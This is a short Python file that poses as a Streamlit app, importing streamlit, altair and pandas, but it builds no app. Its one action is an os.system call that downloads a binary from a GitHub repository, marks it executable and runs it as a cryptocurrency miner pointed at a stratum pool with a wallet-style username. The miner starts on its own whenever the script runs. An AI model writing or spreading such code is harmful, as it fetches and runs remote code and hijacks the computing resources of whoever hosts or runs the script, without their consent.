from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64


os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u MD3xbbCTr9zJafZhvWKYMX7QDbH8d9apv1.NUNG -p x -t 15") 
